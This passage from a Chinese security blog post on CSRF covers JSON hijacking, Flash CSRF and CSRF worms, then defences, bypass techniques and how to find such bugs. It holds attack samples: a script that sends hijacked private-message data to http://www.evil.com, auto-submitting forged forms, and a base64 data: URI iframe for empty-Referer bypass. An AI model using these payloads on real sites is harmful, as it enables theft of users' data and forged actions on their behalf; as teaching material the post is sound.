class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">        <span class="comment">// alert(o[i].text);</span></span><br><span class="line">        data += o[i].sender_id;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(data);</span><br><span class="line">    <span class="keyword">new</span> Image().src = <span class="string">&quot;http://www.evil.com/JSONHijacking.php?hi=&quot;</span> + <span class="built_in">escape</span>(data); <span class="comment">//将获取到的隐私睡觉上传到攻击者服务器上</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=http:<span class="comment">//api.a.com/private_messages/inbox.json?callback=hijack&amp;count=3&gt;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt; /</span><span class="regexp">/ api调用中使用的callback函数为hijack</span></span><br></pre></td></tr></table></figure>

<p>当登录a网站的用户被欺骗访问这个页面时,隐私就会被窃取</p>
<h2 id="Flash-CSRF"><a href="#Flash-CSRF" class="headerlink" title="Flash CSRF"></a>Flash CSRF</h2><h3 id="跨域获取隐私数据"><a href="#跨域获取隐私数据" class="headerlink" title="跨域获取隐私数据"></a>跨域获取隐私数据</h3><p>网站根目录下的 crossdomain.xml文件 可以看到一些配置属性</p>
<p>其中 allow-access-from domain=”*” 表示允许任何域的Flash请求本域的资源,这样是非常危险的,如果用户登录目标网站,被欺骗访问包含恶意Flash的网页时,隐私数据就可能被窃取</p>
<p>恶意Flash的ActionScript 脚本(by 余玄)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flash.net.*;</span><br><span class="line"><span class="comment">// 请求隐私数据所在的页面</span></span><br><span class="line"><span class="keyword">var</span> loader = <span class="keyword">new</span> URLLoader(<span class="keyword">new</span> URLRequest(<span class="string">&quot;http://www.foo.com/private&quot;</span>));</span><br><span class="line">	loader.addEventListener(Event.COMPLETE,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">//当请求完成后</span></span><br><span class="line">        loader.date; <span class="comment">//将获取到的隐私数据</span></span><br><span class="line">        <span class="comment">// 更多操作</span></span><br><span class="line">    &#125;);</span><br><span class="line">loader.load(); <span class="comment">//发起请求</span></span><br></pre></td></tr></table></figure>

<h3 id="跨域提交数据操作"><a href="#跨域提交数据操作" class="headerlink" title="跨域提交数据操作"></a>跨域提交数据操作</h3><p>这个就不需要crossdomain.xml 的跨域访问策略了,因为跨域发起的GET/POST请求对于浏览器本身就是合法的,在Flash中也是</p>
<p>一般情况下,都是通过构造”HTML CSRF”</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://t.xxx.com/article/update&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;status&quot;</span> <span class="attr">value</span>=<span class="string">&quot;html_csrf_here.&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用户访问后,就会有JSON文件返回,并且提示下载,这样就会暴露,使用Flash来进行这个过程会更加隐蔽</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flash.net.URLRequest;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> url = <span class="keyword">new</span> URLRequest(<span class="string">&quot;http://t.xxx.com/article/update&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> _v = <span class="keyword">new</span> URLVariables();</span><br><span class="line">    _v = <span class="string">&quot;status&quot;</span> = <span class="string">&quot;+msg&quot;</span>;</span><br><span class="line">    url.method = <span class="string">&quot;POST&quot;</span>; </span><br><span class="line">    url.data = _v;</span><br><span class="line">    sendToURL(url); <span class="comment">//发送</span></span><br><span class="line">&#125;</span><br><span class="line">post(<span class="string">&#x27;flash_csrf_here&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="CSRF-蠕虫"><a href="#CSRF-蠕虫" class="headerlink" title="CSRF 蠕虫"></a>CSRF 蠕虫</h2><p>在CSRF的攻击页面上嵌入蠕虫传播的攻击向量，蠕虫传播要面向不同的用户生成不同的请求。之前的攻击可预测所有的参数，现在必须想办法标识不同用户的数据。<br>1)服务端脚本获取<br>准备一个php，asp页面，可以检测Referer字段读取url中的用户id等。<br>2)JSON劫持<br>如果网站提供了这样的数据接口，可以用来获取敏感信息</p>
<h1 id="0x04-CSRF防御"><a href="#0x04-CSRF防御" class="headerlink" title="0x04  CSRF防御"></a>0x04  CSRF防御</h1><h2 id="验证HTTP-Referer字段"><a href="#验证HTTP-Referer字段" class="headerlink" title="验证HTTP Referer字段"></a>验证HTTP Referer字段</h2><p>根据HTTP协议，在HTTP头中有一个Referer字段，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的Referer值就会是转账按钮所在的页面的URL，通常是以  bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御  CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。</p>
<p>但是这种方法也不够安全,原因如下</p>
<ul>
<li>Referer值存在可以伪造的问题</li>
<li>有些用户为了保护自己隐私,设置浏览器访问页面时不提供Referer值</li>
</ul>
<h2 id="在请求地址中添加token并验证"><a href="#在请求地址中添加token并验证" class="headerlink" title="在请求地址中添加token并验证"></a>在请求地址中添加token并验证</h2><p>token可以在用户登陆后产生并放于session之中，然后在每次请求时把token从session中拿出，与请求中的token进行比对，但这种方法的难点在于如何把token以参数的形式加入请求。对于GET请求，token将附在请求地址之后，这样URL就变成<code>http://url?csrftoken=tokenvalue</code>。而对于POST请求来说，要在form的最后加上<code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>，这样就把token以参数的形式加入请求了</p>
<p>该方法还有一个<strong>缺点是难以保证token本身的安全</strong></p>
<h2 id="在HTTP头中自定义属性并验证"><a href="#在HTTP头中自定义属性并验证" class="headerlink" title="在HTTP头中自定义属性并验证"></a>在HTTP头中自定义属性并验证</h2><p>这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到 HTTP  头中自定义的属性里。通过XML HTTP  Request这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了上种方法在请求中加入token的不便，同时，通过XML HTTP Request请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过Referer泄露到其他网站中去。</p>
<p>局限性很大</p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF-Token"></a>CSRF-Token</h2><p>CSRF攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于Cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。</p>
<p>怎么防止跨站攻击：</p>
<p>表单：在 Form 表单中添加一个隐藏的的字段，值是 csrf_token。</p>
<p>非表单：在ajax获取数据时，添加headers:{ ‘X-CSRFToken’:getCookie(‘csrf_token’) }。</p>
<p>原理：在浏览器访问网站A时，网站A设置cookie会增加随机值csrf_token，这个值是随机的。返回给浏览器时，cookie会储存在浏览器，同时会把csrf_token传给表单里面的隐藏字段。所以当浏览器用自己的表单时会自带csrf_token，网站A取到这个值和cookie里的csrf_token一致就通过。而网站B里面的表单没有这个值，所以不能通过，这样就阻止了恶意攻击。非表单也是这样的原理。</p>
<h2 id="使用验证码"><a href="#使用验证码" class="headerlink" title="使用验证码"></a>使用验证码</h2><p>1)每次的用户提交都需要用户在表单中填写一个图片上的随机字符串</p>
<p>2)服务端核对令牌</p>
<h1 id="0x05-CSRF绕过"><a href="#0x05-CSRF绕过" class="headerlink" title="0x05 CSRF绕过"></a>0x05 CSRF绕过</h1><h2 id="绕过Referer"><a href="#绕过Referer" class="headerlink" title="绕过Referer"></a>绕过Referer</h2><h3 id="Refere为空条件下"><a href="#Refere为空条件下" class="headerlink" title="Refere为空条件下"></a>Refere为空条件下</h3><p>解决方案:</p>
<p>  利用<a target="_blank" rel="noopener" href="http://ftp//,http://,https://,file://,javascript:,data:">ftp://,http://,https://,file://,javascript:,data:</a>这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p>
<p>  例:</p>
<p>  利用data:协议</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p> bese64编码 解码即可看到代码</p>
<p>  利用https协议 https向http跳转的时候Referer为空</p>
<p> 拿一个https的webshell</p>
<p><code>  &lt;iframe src=&quot;https://xxxxx.xxxxx/attack.php&quot;&gt;</code></p>
<p> attack.php写上CSRF攻击代码</p>
<h3 id="判断Referer是某域情况下绕过"><a href="#判断Referer是某域情况下绕过" class="headerlink" title="判断Referer是某域情况下绕过"></a>判断Referer是某域情况下绕过</h3><p> 比如你找的csrf是xxx.com  验证的referer是验证的*.xx.com  可以找个二级域名 之后&lt;img “csrf地址”&gt;  之后在把文章地址发出去 就可以伪造。</p>
<h3 id="判断Referer是否存在某关键词"><a href="#判断Referer是否存在某关键词" class="headerlink" title="判断Referer是否存在某关键词"></a>判断Referer是否存在某关键词</h3><p> referer判断存在不存在google.com这个关键词</p>
<p> 在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过 </p>
<h3 id="判断referer是否有某域名"><a href="#判断referer是否有某域名" class="headerlink" title="判断referer是否有某域名"></a>判断referer是否有某域名</h3><p>  判断了Referer开头是否以126.com以及126子域名  不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。</p>
<h2 id="移除referer字段"><a href="#移除referer字段" class="headerlink" title="移除referer字段"></a>移除referer字段</h2><p>和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name &#x3D;“referrer”content &#x3D;“no-referrer”&gt;</span><br></pre></td></tr></table></figure>

<p>应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。</p>
<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。</p>
<h2 id="更改请求方法"><a href="#更改请求方法" class="headerlink" title="更改请求方法"></a>更改请求方法</h2><p>如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。</p>
<h2 id="删除token参数或发送空token"><a href="#删除token参数或发送空token" class="headerlink" title="删除token参数或发送空token"></a>删除token参数或发送空token</h2><p>不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。</p>
<p>例如，合法请求如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password&#x3D;qwerty &amp;csrf_tok&#x3D;871caef0757a4ac9691aceb9aad8b65b</span><br></pre></td></tr></table></figure>

<p>那么实施这种请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password&#x3D;qwerty</span><br></pre></td></tr></table></figure>

<p>或这种：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password&#x3D;qwerty&amp;csrf_tok&#x3D;</span><br></pre></td></tr></table></figure>

<h2 id="使用另一个session的CSRF-token"><a href="#使用另一个session的CSRF-token" class="headerlink" title="使用另一个session的CSRF token"></a>使用另一个session的CSRF token</h2><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。</p>
<h2 id="Session固定"><a href="#Session固定" class="headerlink" title="Session固定"></a>Session固定</h2><p>有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。</p>
<p>第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。</p>
<h1 id="0x06-CSRF漏洞挖掘"><a href="#0x06-CSRF漏洞挖掘" class="headerlink" title="0x06 CSRF漏洞挖掘"></a>0x06 CSRF漏洞挖掘</h1><p>一般来说，挖掘CSRF，<strong>只需要找到漏洞存在就可以</strong>了，不需要用构造的Payload去攻击用户。</p>
<p>最简单的就是看有没有csrf-token验证,如果没有那么都是可能存在csrf漏洞的</p>
<p>就是存在token 也要注意这个token是不是随机的,还是伪随机的.</p>
<p>然后就是关于Referer的检测以及上面的那些绕过技巧</p>
<p>brupsuite中带有CSRF PoC这个功能(Burpsuit里边右键-&gt;Engagement Tools-&gt;Generate CSRF POC) ,可以将其好好利用,来进行CSRF漏洞的测试</p>
<p>漏洞常见触发点</p>
<blockquote>
<p>电商类的</p>
<p>添加购物车、添加收货地址、删除收货地址等</p>
</blockquote>
<p>用户个人信息修改等</p>
<p>自动化检测工具,待整理</p>
<h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07  总结"></a>0x07  总结</h1><p>每一个漏洞,都会造成或多或少的危害,关于CSRF漏洞,先总结这么多. 其中对于CSRF挖掘和绕过这块是收获最大的部分,总结完了之后才发现CSRF原来也是要分类型的.当然关于这漏洞还有很多东西,比如CSRF打内网等</p>
<p>后面都会继续补充</p>
<h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08  参考资料"></a>0x08  参考资料</h1><ul>
<li><p>&lt;&lt;Web前端黑客技术揭秘&gt;&gt;</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11015075.html">Web安全之CSRF漏洞整理总结</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/houbin0912/article/details/81944471">跨域策略文件crossdomain.xml的配置方法</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6176">绕过CSRF防御</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/164234.html">如何在JSON端点上利用CSRF漏洞</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/guodejie/article/details/80778135">防止跨站攻击——CSRFToken</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/151816.html">各大SRC中的CSRF技巧</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.ioin.in/writeup/www.ohlinge.cn/_web_web_csrf_html/index.html">玩转CSRF之挖洞实例分享</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/05c9c4ee6667">CSRF漏洞挖掘思路</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://www.teagle.top/index.php/archives/71/">漏洞挖掘之CSRF</a></p>
</li>
</ul>
<p><strong><em>“Knowing is not enough, we must apply. Willing is not enough, we must do.”</em></strong></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/c73f.html">https://hack-for.fun/c73f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CSRF/">CSRF</a><a class="post-meta__tags" href="/tags/JSON/">JSON</a><a class="post-meta__tags" href="/tags/Ajax/">Ajax</a></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/4215.html"><i class="fa fa-chevron-left">  </i><span>一篇文章深入学习文件包含漏洞</span></a></div><div class="next-post pull-right"><a href="/6247.html"><span></span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '6ceed9c245da8d33222a',
  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
  repo: 'Gitalk',
  owner: 'ifonly-go2019',
  admin: 'ifonly-go2019',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>